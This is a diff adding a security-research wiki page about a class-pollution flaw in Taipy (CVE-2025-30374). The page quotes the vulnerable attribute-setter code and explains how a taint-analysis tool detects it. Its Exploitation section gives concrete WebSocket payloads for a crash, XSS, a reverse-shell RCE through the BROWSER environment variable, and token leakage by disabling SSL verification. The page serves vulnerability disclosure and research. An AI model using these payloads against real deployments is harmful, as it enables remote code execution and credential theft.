@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Taipy | Python Class Pollution</title>
+    <link rel="stylesheet" href="/wiki/css/wiki.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+    <div class="wiki-layout">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <a href="/">Class Pollution Wiki</a>
+            </div>
+            <ul class="sidebar-nav">
+
+
+    
+    <li>
+        <a href="/wiki/docs/taxonomy/" >Taxonomy</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/taxonomy/primitives/" >Pollution Primitives</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/types/" >Vulnerability Types</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/consequences/" >Consequences</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/targets/" >Pollution Targets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/targets/classes/" >Classes</a></li>
+            
+            <li><a href="/wiki/docs/targets/modules/" >Modules</a></li>
+            
+            <li><a href="/wiki/docs/targets/functions/" >Functions</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/gadgets/" >Gadgets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/gadgets/rce/" >RCE Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/xss/" >XSS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/auth-bypass/" >Auth Bypass Gadgets</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/tool/" >Tool</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/tool/pyrl/" >Pyrl</a></li>
+            
+            <li><a href="/wiki/docs/tool/polluter/" >Polluter</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/collection/" >Collection</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/collection/showcases/" >Showcases</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/defense/" >Defense</a>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/reference/" >Reference</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/reference/cve-index/" >CVE Index</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/faq/" >FAQ</a>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/history/" >History</a>
+        
+    </li>
+    
+
+</ul>
+
+        </nav>
+        <main class="content">
+            
+<article>
+    <h1 id="taipy-cve-2025-30374">Taipy (CVE-2025-30374)</h1>
+<p><strong>Taipy</strong> is a popular Python framework for building data applications (19.2K stars), widely used in ML/AI workflows.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Field</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Repository</td>
+          <td><a href="https://github.com/Avaiga/taipy">Avaiga/taipy</a></td>
+      </tr>
+      <tr>
+          <td>Version</td>
+          <td>v4.0.3</td>
+      </tr>
+      <tr>
+          <td>CVE</td>
+          <td>CVE-2025-30374</td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Constrained-Get × Attr-Set</td>
+      </tr>
+      <tr>
+          <td>Input</td>
+          <td>Remote (WebSocket)</td>
+      </tr>
+      <tr>
+          <td>Status</td>
+          <td>Fixed</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The vulnerability lies in <code>_attrsetter</code> in <code>taipy/gui/utils/_attributes.py</code>, which processes client update requests via WebSocket:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_attrsetter</span>(obj: object, attr_str: str, value: object) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    var_name_split <span style="color:#f92672">=</span> attr_str<span style="color:#f92672">.</span>split(sep<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(var_name_split) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        sub_name <span style="color:#f92672">=</span> var_name_split[i]
+</span></span><span style="display:flex;"><span>        obj <span style="color:#f92672">=</span> getattr(obj, sub_name)        <span style="color:#75715e"># Constrained: getattr only</span>
+</span></span><span style="display:flex;"><span>    setattr(obj, var_name_split[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], value)  <span style="color:#75715e"># Attr-Set only</span>
+</span></span></code></pre></div><p>The function:</p>
+<ol>
+<li>Splits the attacker-controlled <code>attr_str</code> by dots</li>
+<li>Resolves each segment via <code>getattr</code> (Constrained-Get)</li>
+<li>Sets the final attribute with <code>setattr</code> (Attr-Set)</li>
+</ol>
+<p>No validation is performed on the attribute path.</p>
+<h2 id="detection-by-pyrl">Detection by Pyrl</h2>
+<p>Pyrl tracks the taint from WebSocket input:</p>
+<ol>
+<li><code>attr_str</code> and <code>value</code> parameters carry <code>T_INPUT</code></li>
+<li>After <code>split(&quot;.&quot;)</code>, <code>var_name_split</code> is <code>T_ENUM</code></li>
+<li>Loop iteration: each <code>sub_name</code> is <code>T_KEY</code></li>
+<li><code>getattr(obj, sub_name)</code> produces <code>T_OBJ</code> with <code>G_ATTR</code></li>
+<li>Since only <code>getattr</code> is used (no item access branch): <strong>Constrained-Get</strong></li>
+<li><code>setattr</code> sink: <strong>Attr-Set</strong></li>
+</ol>
+<p>Classification: <strong>Constrained-Get × Attr-Set</strong></p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="dos">DoS</h3>
+<pre tabindex="0"><code>attr_str: __class__.__getattribute__
+value: &#34;crash&#34;
+</code></pre><h3 id="xss">XSS</h3>
+<p>Via the same BeautifulSoup entity map technique as django-unicorn:</p>
+<pre tabindex="0"><code>attr_str: __class__.__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.&lt;
+value: &lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><h3 id="rce">RCE</h3>
+<p>Via environment variable pollution:</p>
+<pre tabindex="0"><code>attr_str: __class__.__init__.__globals__.sys.modules.os.environ.BROWSER
+value: /bin/sh -c &#39;reverse_shell_command&#39;
+</code></pre><h3 id="token-leakage">Token Leakage</h3>
+<p>Via disabling SSL verification or redirecting API calls:</p>
+<pre tabindex="0"><code>attr_str: __class__.__init__.__globals__.sys.modules.os.environ.REQUESTS_CA_BUNDLE
+value: /dev/null
+</code></pre><h2 id="impact">Impact</h2>
+<p>Taipy is used in production ML pipelines and data applications. The WebSocket endpoint is accessible to any authenticated user, making this a remote-triggerable vulnerability with severe consequences. Taipy Enterprise promptly patched the issue after responsible disclosure.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>See <a href="https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/taipy/poc"><code>cp-collection/taipy/poc/</code></a> for the full exploit.</p>
+
+</article>
+
+        </main>
+    </div>
+</body>
+</html>
